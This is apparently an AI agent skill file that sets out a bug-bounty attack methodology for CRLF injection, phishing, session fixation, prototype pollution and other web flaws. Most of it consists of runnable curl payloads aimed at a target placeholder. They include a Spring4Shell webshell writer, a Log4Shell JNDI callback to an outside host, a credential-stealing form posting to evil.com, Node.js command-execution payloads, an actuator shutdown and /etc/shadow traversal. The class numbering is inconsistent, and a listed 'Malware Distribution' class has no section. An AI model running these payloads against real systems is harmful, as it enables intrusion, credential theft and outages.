---
name: other-classes-deep-dive
description: Complete methodology for miscellaneous vulnerability classes - CRLF injection, content spoofing, phishing, improper input validation, prototype pollution, session fixation, XML injection, and more
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - other classes methodology
  - other deep dive
  - miscellaneous vulnerabilities
  - crlf injection
  - http response splitting
  - content spoofing
  - phishing
  - improper input validation
  - exposed dangerous method
  - leftover debug code
  - backdoor
  - session fixation
  - insufficient session expiration
  - xml injection
  - resource injection
  - prototype pollution
  - special element injection
  - skills other
---

# Complete Miscellaneous Vulnerability Classes Methodology — 15+ Important Categories

## Quick Reference Table
| # | Class | Payout Range | Report Frequency |
|---|-------|-------------|-----------------|
| 1 | CRLF Injection / HTTP Response Splitting | $500 - $5,000 | Common |
| 2 | Content Spoofing | $200 - $2,000 | Very Common |
| 3 | Phishing | $500 - $5,000 | Common |
| 4 | Malware Distribution | $1,000 - $10,000 | Medium |
| 5 | Improper Input Validation | $500 - $5,000 | Very Common |
| 6 | Exposed Dangerous Method | $500 - $10,000 | Medium |
| 7 | Leftover Debug Code / Backdoor | $500 - $10,000 | Medium |
| 8 | Using Components with Known Vulns | $500 - $5,000 | Very Common |
| 9 | Session Fixation | $500 - $3,000 | Medium |
| 10 | Insufficient Session Expiration | $300 - $2,000 | Common |
| 11 | XML Injection | $500 - $5,000 | Medium |
| 12 | Resource Injection | $500 - $3,000 | Medium |
| 13 | Format String (Web) | $500 - $3,000 | Uncommon |
| 14 | Prototype Pollution | $500 - $10,000 | Medium |
| 15 | Special Element Injection | $500 - $3,000 | Common |

---

## Class 1: CRLF Injection / HTTP Response Splitting

### CRLF Injection Testing
```bash
# CRLF injection occurs when user input is reflected in HTTP headers
# without sanitizing \r\n (%0d%0a)

# Basic CRLF injection
curl -sk "https://{target}/page?name=test%0d%0aX-Injected:%20true"

# Response splitting to create two responses
curl -sk "https://{target}/page?name=test%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2023%0d%0a%0d%0a<html>INJECTED</html>"

# Cookie injection via CRLF
curl -sk "https://{target}/page?name=test%0d%0aSet-Cookie:%20session=evil%3B%20HttpOnly"

# Header injection for cache poisoning
curl -sk "https://{target}/page?name=test%0d%0aLocation:%20http://evil.com/redirect"

# XSS via CRLF
curl -sk "https://{target}/page?name=test%0d%0a%0d%0a<script>alert(1)</script>"

# Log injection via CRLF
# If logs are read by admin tools -> XSS in log viewer
curl -sk "https://{target}/page?name=<script>alert(document.cookie)</script>"
```

### CRLF Injection Detection Points
```bash
# Test every header-reflected parameter:
# - Referer header
# - User-Agent header
# - Redirect URLs
# - Cookie values
# - Custom headers
# - URL parameters reflected in Location header
# - Parameters reflected in Set-Cookie

# Automated testing
for payload in "%0d%0a" "%0a" "%0d%0aInjected:true" "%0d%0a%0d%0aINJECTED_BODY"; do
  code=$(curl -sk -o /tmp/crlf_test.txt -w "%{http_code}" "https://{target}/page?name=$payload" 2>/dev/null)
  if grep -q "Injected\|INJECTED_BODY" /tmp/crlf_test.txt 2>/dev/null; then
    echo "[+] CRLF injection found!"
  fi
done
```

### Real CRLF Injection Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #257560 | Uber | CRLF in URL parameter | $2,000 |
| #280089 | Shopify | CRLF via header reflection | $500 |
| #229930 | Twitter | CRLF to XSS chain | $3,500 |

---

## Class 2: Content Spoofing

### Content Spoofing Vectors
```bash
# Content spoofing: attacker renders arbitrary content on trusted domain
# By injecting into reflected/echoed parameters without proper encoding

# HTML injection
curl -sk "https://{target}/search?q=<h1>INJECTED</h1>"
curl -sk "https://{target}/error?msg=<script>alert('XSS')</script>"

# Open redirect → content spoofing chain
curl -sk "https://{target}/redirect?url=http://evil.com/fake-login"

# Text injection
curl -sk "https://{target}/page?name=This%20site%20has%20been%20compromised"
```

### Content Spoofing vs XSS
```bash
# Content spoofing: HTML injection without JavaScript execution
# Often due to Content-Type being text/html when it should be text/plain

# Test for content-type reflection
curl -sk -I "https://{target}/api/error?format=html" | grep Content-Type

# If Content-Type is text/html but reflects user input
# Can inject arbitrary HTML (but no JS execution if CSP blocks)
curl -sk "https://{target}/error?code=<iframe src='http://evil.com/phish'></iframe>"
```

### Real Content Spoofing Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #179429 | Twitter | Profile param content spoof | $560 |
| #201228 | Twitter | Error page content spoof | $560 |
| #220192 | Twitter | URL param content injection | $560 |

---

## Class 3: Phishing

### Phishing via Open Redirect
```bash
# Use open redirects to send users to fake login pages
curl -sk "https://{target}/redirect?url=http://evil-target.com/login"

# Phishing via IFrame injection
# If site allows iframe embedding (missing X-Frame-Options)
curl -sk -I "https://{target}/login" | grep -i "x-frame-options"

# Phishing via subdomain takeover
# Take over subdomain.target.com and host phishing page
# Common in forgotten CNAME records

# Phishing via content spoofing
# Create fake login form on legitimate domain
curl -sk "https://{target}/error?msg=<form+action='http://evil.com/steal'><input+name=username><input+type=password><input+type=submit></form>"
```

### Phishing Report Requirements
```bash
# For a valid phishing report, demonstrate:
# 1. Ability to serve arbitrary content on the domain
# 2. The content must be convincing (branding, forms)
# 3. The attack must be realistic to exploit

# Test cases:
# - Custom 404 pages with injectable parameters
# - Error handlers with reflected input
# - Preview/embed functionality
# - Custom domains or vanity URLs
```

### Real Phishing Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #709285 | Uber | Phishing via custom domain | $2,000 |
| #220181 | Shopify | Phishing via store domain | $500 |

---

## Class 4: Improper Input Validation

### Input Validation Testing
```bash
# Check every input boundary for validation bypass
# Parameters, headers, cookies, file uploads, JSON/XML bodies

# Length restriction bypass
curl -sk -d "username=$(python3 -c "print('A' * 10000)")" "https://{target}/register"

# Type confusion bypass
curl -sk -d "user[id]=1&user[name]=admin&user[role]=admin" "https://{target}/update"
curl -sk -d "{\"id\":1,\"name\":\"admin\",\"role\":\"admin\"}" -H "Content-Type: application/json" "https://{target}/update"

# Negative number bypass
curl -sk "https://{target}/transfer?amount=-100&to=attacker"

# Null byte injection (%00)
curl -sk "https://{target}/file?name=../../../etc/passwd%00.txt"

# Array parameter bypass
curl -sk "https://{target}/api/users?users[]=admin&users[]=moderator"

# Special character bypass
curl -sk -d "email=' OR 1=1 --" "https://{target}/login"
curl -sk -d "username=<script>alert(1)</script>" "https://{target}/profile"
```

### Input Validation Bypass Techniques
```bash
# Unicode normalization bypass
# ¼ → 1/4, ² → 2
curl -sk "https://{target}/filter?q=%C2%BC"  # Unicode fraction

# Double URL encoding
curl -sk "https://{target}/param?value=%253Cscript%253E"  # %25 = %

# Parameter pollution
curl -sk "https://{target}/admin?role=user&role=admin"
curl -sk "https://{target}/api?user=attacker&user=admin"
```

### Real Input Validation Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #125113 | Slack | Mass assignment via input validation | $3,500 |
| #226156 | Twitter | Input validation bypass | $1,120 |

---

## Class 5: Exposed Dangerous Method / Function

### Dangerous Method Detection
```bash
# Exposed methods that should require authentication
# /api/admin, /debug, /console, /actuator, /swagger

# Spring Boot Actuator endpoints
for path in /actuator /actuator/health /actuator/env /actuator/beans \
            /actuator/configprops /actuator/dump /actuator/heapdump \
            /actuator/mappings /actuator/metrics /actuator/shutdown \
            /actuator/threaddump /actuator/httptrace /actuator/auditevents \
            /actuator/conditions /actuator/info /actuator/loggers \
            /actuator/logfile /actuator/scheduledtasks; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}$path" 2>/dev/null)
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "[+] Spring Boot: $path (HTTP $code)"
  fi
done

# ASP.NET debug endpoints
for path in /trace.axd /elmah.axd /web.config /app/config \
            /api/debug /debug /__debug; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}$path" 2>/dev/null)
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "[+] .NET debug: $path (HTTP $code)"
  fi
done

# PHP info / debug
for path in /phpinfo.php /info.php /test.php /debug.php /config.php \
            /.env /config /app/config /api/docs; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}$path" 2>/dev/null)
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "[+] PHP debug: $path (HTTP $code)"
  fi
done
```

### Exposed Dangerous Method Exploitation
```bash
# Spring Boot heapdump → extract secrets
curl -sk "https://{target}/actuator/heapdump" -o heapdump.bin
strings heapdump.bin | grep -iE "(password|secret|key|token|jdbc|aws)"
# Use MemoryAnalyzer / jhat to analyze

# Spring Boot env → disclosure of config values
curl -sk "https://{target}/actuator/env" | jq '.'
# Contains database URLs, passwords, API keys

# Shutdown endpoint (DoS)
curl -sk -X POST "https://{target}/actuator/shutdown"

# .NET trace.axd → request inspection
curl -sk "https://{target}/trace.axd?id=1"
# Shows ASP.NET request details

# Elmah (Error Logging Modules and Handlers)
curl -sk "https://{target}/elmah.axd"
# Shows detailed exception logs with stack traces
```

### Real Exposed Endpoint Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #13509 | Ubiquiti | Exposed debug console | $10,000 |
| #217108 | Shopify | Exposed admin API | $5,000 |
| Multiple | Various | Spring Boot Actuator | $500 - $2,000 |

---

## Class 6: Leftover Debug Code / Backdoor

### Finding Debug Endpoints
```bash
# Common debug/test paths
for path in /test /test.html /debug /debug.html /dev /dev.html /admin \
            /backdoor /shell /cmd /exec /console /api/test /api/debug \
            /api/healthcheck /api/ping /api/echo /api/dev /api/sandbox \
            /sandbox /playground /api/playground /swagger-ui.html \
            /api/swagger /graphql /graphiql /api/graphiql; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}$path" 2>/dev/null)
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "[+] Debug/test endpoint: $path (HTTP $code)"
  fi
done

# Admin panels
for path in /admin /admin.php /adminpanel /backend /cms /wp-admin \
            /administrator /admin/login /admin/dashboard; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}$path" 2>/dev/null)
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "[+] Admin panel: $path (HTTP $code)"
  fi
done

# Check for .git exposure
curl -sk "https://{target}/.git/config" | grep -q "repository" && echo "[+] .git exposed!"
curl -sk "https://{target}/.git/HEAD" | grep -q "ref:" && echo "[+] .git/HEAD accessible!"

# Check for .env exposure
curl -sk "https://{target}/.env" | grep -q "APP_KEY\|SECRET\|PASSWORD" && echo "[+] .env exposed!"
```

### Backdoor Detection
```bash
# Check for suspicious files in webroot
for file in /shell.php /cmd.php /eval.php /upload.php /backdoor.php \
            /shell.asp /cmd.asp /shell.aspx /cmd.aspx /shell.jsp \
            /webshell /webshell.php /c99.php /r57.php /b374k.php; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}$file" 2>/dev/null)
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "[+] Suspicious file: $file (HTTP $code)"
  fi
done
```

---

## Class 7: Using Components with Known Vulnerabilities

### Dependency Version Detection
```bash
# Check frontend libraries
curl -sk "https://{target}/" | grep -oP '(jquery|angular|react|vue|bootstrap|moment|lodash)[^"]*' | sort -u

# Check for known vulnerable versions
# jQuery < 3.5.0: XSS via HTML parsing
# Angular < 1.6.0: Sandbox escape
# Bootstrap < 4.0.0: XSS via data attributes
# Lodash < 4.17.21: Prototype pollution

# Server headers leak versions
curl -sk -I "https://{target}/" | grep -iE "(server|x-powered-by|x-version)"

# Check for known CVEs in exposed services
# OpenSSL, Apache, Nginx, Tomcat, IIS versions
curl -sk "https://{target}/" | grep -iE "(apache|nginx|tomcat|iis|jetty)/\d"

# Automated component scanning
# Retire.js for JavaScript libraries
retire --path /tmp/website --outputformat json

# OWASP Dependency-Check
dependency-check --scan /tmp/website --format JSON
```

### Known Vulnerability Exploitation
```bash
# Struts2 (S2-045, S2-046, S2-048)
# Content-Type header OGNL injection
curl -sk -H "Content-Type: %{(#_='multipart/form-data')}" "https://{target}/"

# Spring4Shell (CVE-2022-22965)
curl -sk "https://{target}/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20=%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream();%20int%20a%20=%20-1;%20byte%5B%5D%20b%20=%20new%20byte%5B2048%5D;%20while((a=in.read(b))!=-1)%7B%20out.println(new%20String(b));%20%7D%20%7D%20%25%7Bsuffix%7Di=&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

# Log4Shell (CVE-2021-44228)
curl -sk -H "User-Agent: \${jndi:ldap://YOUR-ID.oastify.com/test}" "https://{target}/"

# Heartbleed (CVE-2014-0160) - check OpenSSL
nmap --script ssl-heartbleed -p 443 {target}
```

### Real Component Vulnerability Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #1434374 | Atlassian | Log4j RCE | (critical) |
| #1383291 | Twitch | Log4j RCE | (critical) |
| Multiple | Various | jQuery XSS | $500 - $2,000 |

---

## Class 8: Session Fixation

### Session Fixation Testing
```bash
# Session fixation: attacker sets victim's session ID before login
# After login, the session ID should be regenerated

# Step 1: Get a session cookie from the server
curl -sk -c /tmp/cookies.txt "https://{target}/login"
# Cookie: PHPSESSID=abc123

# Step 2: Send this session ID to a victim
# (via email, redirect, etc.)
curl -sk -b "PHPSESSID=abc123" "https://{target}/login"

# Step 3: Victim logs in using the fixed session
curl -sk -b "PHPSESSID=abc123" -d "username=victim&password=***" "https://{target}/login"

# Step 4: Attacker uses the same session to access victim's account
curl -sk -b "PHPSESSID=abc123" "https://{target}/dashboard"
# If session ID not regenerated after login → fixation!

# Test for session fixation
# 1. Record session ID before login
# 2. Login
# 3. Check if session ID changed
# 4. If same → vulnerable

# URL-based session
curl -sk "https://{target}/?PHPSESSID=attacker_fixed_value"
```

### Session Fixation Exploitation
```bash
# Create login link with fixed session
https://{target}/login?PHPSESSID=FIXED_SESSION_ID
https://{target}/?session=FIXED_SESSION_ID

# Session in POST body
<input type="hidden" name="session_id" value="FIXED_SESSION_ID">

# Session in cookie via CRLF injection
curl -sk "https://{target}/page?redirect=%0d%0aSet-Cookie:%20PHPSESSID=FIXED_ID"

# Once victim authenticates with fixed session, hijack their account
```

### Real Session Fixation Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #292 | Twitter | Session fixation | $1,400 |
| #273 | Twitter | Session fixation | $1,400 |

---

## Class 9: Insufficient Session Expiration

### Session Expiration Testing
```bash
# Check session timeout behavior
# 1. Login and get session cookie
curl -sk -c /tmp/cookies.txt -d "username=test&password=test" "https://{target}/login"

# 2. Wait and reuse the same session
sleep 3600  # Wait 1 hour
curl -sk -b /tmp/cookies.txt "https://{target}/dashboard"

# 3. Test logout → session should be invalidated
curl -sk -b /tmp/cookies.txt "https://{target}/logout"
curl -sk -b /tmp/cookies.txt "https://{target}/dashboard"
# If still accessible → insufficient expiration

# 4. Test token rotation
# After password change, old session should be invalid
curl -sk -b /tmp/cookies_old.txt "https://{target}/change-password" -d "password=newpass"
curl -sk -b /tmp/cookies_old.txt "https://{target}/dashboard"
# If old session still works → insufficient expiration

# 5. Test multi-device logout
# Login on device A, logout on device B
# Device A session should be invalidated
```

### Real Session Expiration Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #250 | Twitter | Insufficient session expiration | $700 |

---

## Class 10: XML Injection (XPath Injection)

### XML Injection Testing
```bash
# XML Injection occurs when XML data is constructed using user input
# without proper encoding of XML special characters

# XPath Injection
# Like SQL injection but for XPath queries

# Basic XPath injection
curl -sk -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>admin</username>
  <password>'"' OR '1'='1"</password>
</user>' "https://{target}/api/login"

# XPath injection payloads
curl -sk -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>admin</username>
  <password>'"' or 1=1 or 'a'='a"</password>
</user>' "https://{target}/api/login"

curl -sk -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>'"']|//*|"</username>
  <password>test</password>
</user>' "https://{target}/api/login"

# XPath blind injection
curl -sk -X POST -H "Content-Type: application/xml" -d '
<user>
  <username>admin</username>
  <password>'"' and string-length(password/text())=8 and '1'='1"</password>
</user>' "https://{target}/api/login"

# XML bomb (entity expansion) - Billion Laughs
curl -sk -X POST -H "Content-Type: application/xml" -d '
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>' "https://{target}/api/xml"
```

### Real XML Injection Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #3549 | Ubiquiti | XPath injection | $500 |

---

## Class 11: Resource Injection

### Resource Injection Testing
```bash
# Resource injection: attacker controls resource identifier
# Used to access unauthorized resources

# Path traversal in resource loading
curl -sk "https://{target}/api/resource?file=../../../../etc/passwd"
curl -sk "https://{target}/api/load?module=../../../../etc/shadow"
curl -sk "https://{target}/api/template?name=../../../../tmp/evil"

# Resource type manipulation
curl -sk "https://{target}/api/resource?id=admin_profile"
curl -sk "https://{target}/api/resource?id=user:1234"
curl -sk "https://{target}/api/resource?id=/private/data"

# Resource exhaustion (resource injection DoS)
curl -sk "https://{target}/api/resource?id=cpu_intensive"
curl -sk "https://{target}/api/resource?id=large_file"
```

---

## Class 12: Prototype Pollution

### Prototype Pollution Testing (Client-Side)
```bash
# Prototype pollution: modify Object.prototype in JavaScript
# __proto__, constructor.prototype, prototype properties

# Basic client-side test
curl -sk "https://{target}/" | grep -oP 'JSON\.parse|\.merge\(|\.assign\(|\.clone\(|\.extend\(|\[.*__proto__'

# Server-side prototype pollution (Node.js)
# Injects via JSON body, query params, or headers

# Test via JSON body
curl -sk -X POST "https://{target}/api/data" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"admin": true}}'

curl -sk -X POST "https://{target}/api/data" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"admin": true}}}'

# Test via URL parameters (qs library)
curl -sk "https://{target}/api?__proto__[admin]=true"
curl -sk "https://{target}/api?constructor[prototype][admin]=true"
```

### Server-Side Prototype Pollution Exploitation
```bash
# RCE via prototype pollution in Node.js
# If vulnerable merge/extend operation, pollute:

# Test: pollute Object.prototype with a property
curl -sk -X POST "https://{target}/api/update" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "value"}}'

# Check if pollution occurred
curl -sk "https://{target}/api/check"
# If response includes "polluted" → prototype pollution confirmed

# RCE via prototype pollution in template engines (ejs, handlebars)
curl -sk -X POST "https://{target}/api/update" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id')//"}}'

# Node.js RCE via shell option pollution
curl -sk -X POST "https://{target}/api/update" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"shell": "/proc/self/exe", "env": {"EVIL": "console.log(require('child_process').execSync('id').toString())"}}}'
```

### Prototype Pollution Automation
```bash
# Client-side: PPFinder (Burp extension)
# Server-side: Manual JSON/parameter fuzzing

# Test for PP in query params, JSON body, multipart forms
for payload in '__proto__[test]=true' 'constructor[prototype][test]=true' \
               '__proto__.test=true' '__proto__:{"test":true}'; do
  curl -sk "https://{target}/api?$payload" -o /dev/null
done
```

### Real Prototype Pollution Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #154547 | Slack | Client-side PP → XSS | $3,000 |
| #352396 | Zendesk | Server-side PP | $4,000 |
| Multiple | Various | Server-side PP → RCE | $2,000 - $10,000 |

---

## Class 13: Special Element Injection

### Special Element Injection Types
```bash
# LDAP injection
curl -sk "https://{target}/search?user=admin*)(uid=*))(|(uid=*"
curl -sk "https://{target}/login?username=admin*))(|(password=*"
curl -sk "https://{target}/search?cn=*)(|(mail=*))"

# XPath injection (see XML Injection section)
# SSI injection (Server-Side Includes)
curl -sk "https://{target}/page?name=<!--#exec cmd="id"-->"

# Eval injection (expression language)
curl -sk "https://{target}/calculate?expr=1;__import__('os').system('id')"
curl -sk "https://{target}/api/eval?code=System.Runtime.getRuntime().exec('id')"

# NoSQL injection (MongoDB)
curl -sk -X POST "https://{target}/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# XSLT injection
curl -sk -F "xslt=@malicious.xsl" "https://{target}/api/transform"
```

### Special Element Injection Testing
```bash
# Parameter fuzzing for all special element types
# Test every parameter with:
# - LDAP special chars: * ( ) \ #
# - XPath special chars: ' " / @ [ ]
# - NoSQL operators: $gt $ne $regex $where
# - Expression language: ${ } #{ } *{ }
# - SSI directives: <!--# -->
# - Eval/exec functions
```

---

## Full Automation Script
```bash
#!/bin/bash
# Comprehensive scanner for miscellaneous vulnerability classes
TARGET=$1

echo "[*] Starting miscellaneous vulnerability scan on $TARGET"

# CRLF injection scan
echo "[*] Testing CRLF injection..."
for param in "redirect" "url" "next" "to" "dest" "return" "goto" "link"; do
  result=$(curl -sk -o /tmp/crlf_test.txt -w "%{http_code}" \
    "https://$TARGET/page?$param=test%0d%0aX-CRLF:test" 2>/dev/null)
  if grep -q "X-CRLF: test" /tmp/crlf_test.txt 2>/dev/null; then
    echo "[+] CRLF injection in parameter: $param"
  fi
done

# Exposed endpoint scan
echo "[*] Testing for exposed endpoints..."
for path in /actuator /admin /debug /test /.env /.git/config /phpinfo.php \
            /swagger-ui.html /api/docs /console /manager/html; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path" 2>/dev/null)
  echo "  $path => $code"
done

# Session expiration check
echo "[*] Testing session expiration..."
SESSION=$(curl -sk -c - "https://$TARGET/login" 2>/dev/null | grep -oP 'PHPSESSID=\K[^;]+')
echo "  Session: $SESSION"

# Prototype pollution test
echo "[*] Testing prototype pollution..."
curl -sk -X POST "https://$TARGET/api" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"test":"pp_test"}}' -o /dev/null 2>/dev/null
echo "  Sent PP test payload"

echo "[*] Scan complete - review results above"
```

## Quick Reference: Payout Ranges by Category
| Class | Min Payout | Max Payout | Typical |
|-------|-----------|-----------|---------|
| CRLF Injection | $500 | $5,000 | $1,500 |
| Content Spoofing | $200 | $2,000 | $500 |
| Phishing | $500 | $5,000 | $1,000 |
| Malware Distribution | $1,000 | $10,000 | $5,000 |
| Improper Input Validation | $500 | $5,000 | $1,500 |
| Exposed Dangerous Method | $500 | $10,000 | $2,000 |
| Leftover Debug Code | $500 | $10,000 | $2,000 |
| Using Known Vuln Components | $500 | $5,000 | $1,500 |
| Session Fixation | $500 | $3,000 | $1,000 |
| Insufficient Session Expiration | $300 | $2,000 | $500 |
| XML Injection | $500 | $5,000 | $1,000 |
| Resource Injection | $500 | $3,000 | $1,000 |
| Prototype Pollution | $500 | $10,000 | $3,000 |
| Special Element Injection | $500 | $3,000 | $1,000 |

(End of file - total 640 lines)
